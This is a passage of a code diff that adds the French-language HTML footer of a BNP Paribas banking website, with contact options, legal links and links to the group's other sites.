+                Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.
+            </p>
+        </a>
+
+        <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-trouver/trouver-une-agence" class="footer-section_container1 col-3 mob-50">
+            <span class="footer-section_titre1">Trouver une agence</span>
+            <p class="footer-section_content1">
+                Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.
+            </p>
+        </a>
+
+
+        <a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/nos-applications" class="footer-section_container1 col-3 mob-50">
+            <span class="footer-section_titre1">les applications mobiles</span>
+            <p class="footer-section_content1">
+                Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.
+            </p>
+        </a>
+    </div>
+
+    <div class="footer-section">
+        <div class="footer-section_container2 col-4 mob-100">
+            <span class="footer-section_titre2">Informations légales</span>
+            <ul class="footer-section_liens">
+                <li><a href="https://mabanque.bnpparibas/fr/espace-donnees-personnelles" class="footer-section_liens-el">Données personnelles</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/mentions-legales" class="footer-section_liens-el">Mentions légales</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/cookies" class="footer-section_liens-el">Cookies</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/reglementation" class="footer-section_liens-el">Réglementation</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/reglementation/fonds-de-garantie-des-depots-et-de-resolution" class="footer-section_liens-el">Fonds de Garantie des Dépôts et résolution</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section_container2 col-4 mob-100">
+            <span class="footer-section_titre2">Nous connaître</span>
+            <ul class="footer-section_liens">
+                <li><a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/la-banque-d-un-monde-qui-change" class="footer-section_liens-el">La banque d’un monde qui change</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/engagements-responsables" class="footer-section_liens-el">Nos engagements responsables</a></li>
+                <li><a href="https://group.bnpparibas/emploi-carriere" class="footer-section_liens-el">Emploi &amp; Carrière</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section_container2 col-4 mob-100">
+            <span class="footer-section_titre2">Informations</span>
+            <ul class="footer-section_liens">
+				<li><a href="https://mabanque.bnpparibas/fr/accessibilite" class="footer-section_liens-el lien-footer-accessible">Site Accessible</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/site-securise" class="footer-section_liens-el">Site Sécurisé</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas/conditions-eligibilite" class="footer-section_liens-el">Conditions d’éligibilité</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/notre-offre/tarifs-et-conditions-bnp-paribas/conditions-tarifaires" class="footer-section_liens-el">Tarifs et conditions</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/glossaire" class="footer-section_liens-el">Glossaire</a></li>
+                <li><a href="https://mabanque.bnpparibas/fr/notre-offre/le-kiosque" class="footer-section_liens-el">Guides et brochures</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section_container2 col-4 mob-100">
+            <span class="footer-section_titre2">Nos autres sites</span>
+            <ul class="footer-section_liens">
+                <li><a href="https://mabanquepro.bnpparibas/" class="footer-section_liens-el" target="_blank">Les Professionnels</a></li>
+                <li><a href="https://banqueentreprise.bnpparibas/fr/accueil" class="footer-section_liens-el" target="_blank">Les Entreprises</a></li>
+                <li><a href="https://associations.bnpparibas.fr/fr/web/world/assos/index186/" class="footer-section_liens-el" target="_blank">Les Associations</a></li>
+                <li><a href="https://mabanqueprivee.bnpparibas/" class="footer-section_liens-el" target="_blank">La Banque Privée</a></li>
+                <li><a href="https://www.hellobank.fr/" class="footer-section_liens-el" target="_blank">La Banque en ligne</a></li>
+                <li><a href="https://group.bnpparibas/" class="footer-section_liens-el" target="_blank">Le Groupe BNP Paribas</a></li>
+            </ul>
+        </div> 
+    </div>   
+
+    <div class="footer-section">
+        <div class="footer-section_mentions-legales">
+            <p>
+                Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller
+                est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro
+                de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera
+                à nouveau en retour. 
+            </p>  
+        </div>
+    </div>
+
+</footer> </div>
+              
+      </div>
+	 	
+ 
+
+ 
+  </body></html>
